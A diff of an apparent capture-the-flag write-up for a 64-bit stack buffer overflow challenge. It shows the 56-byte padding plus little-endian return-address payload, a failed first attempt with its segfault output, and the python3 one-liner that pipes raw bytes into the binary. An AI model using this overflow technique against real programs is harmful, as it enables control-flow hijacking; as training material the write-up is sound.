@@ -68,27 +68,29 @@ $ objdump -d /problems/stack2r-64_7_6f3f38bb74a66565cc9342709dadda5e/stack2-64 |
 exploit_str = b"A" * offset + p64(0x5555555547aa)
 ```
 
-
 ## It works! Now what?
 
-- we need to run the file directly, and manually input the exploit string.
+- We need to run the file directly, and manually input the exploit string.
 - To get the converted string, enter the python3 enviornment and run the code for our exploit stirng crafting. we will get
 `b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaaGUUUU\x00\x00'`
 
 ### Try #1
 
-- converting the string directly into the 
+- Piping the string directly into the binary didnt work, so i tried to manually build it with so
+- I converted the hexadecimal directly into a little endian expressed bit string
+
 ``` bash
 $ python3 -u -c 'print(b"A" * 56 + b"\xaa\x47\x55\x55\x55\x55\x00\x00")' | ./stack2-64 
 Calling function pointer, jumping to 0x55476161785c4141
 Segmentation fault (core dumped)
 ```
 
-- doing this, we get issues with terminal input inputting unwanted ascii
+- Doing this, we get issues with terminal input inputting unwanted ascii characters
 
 ### Try #2
 
 ```bash
 python3 -u -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaaGUUUU\x00\x00")' | ./stack2-64
 ```
+
 this works!!!
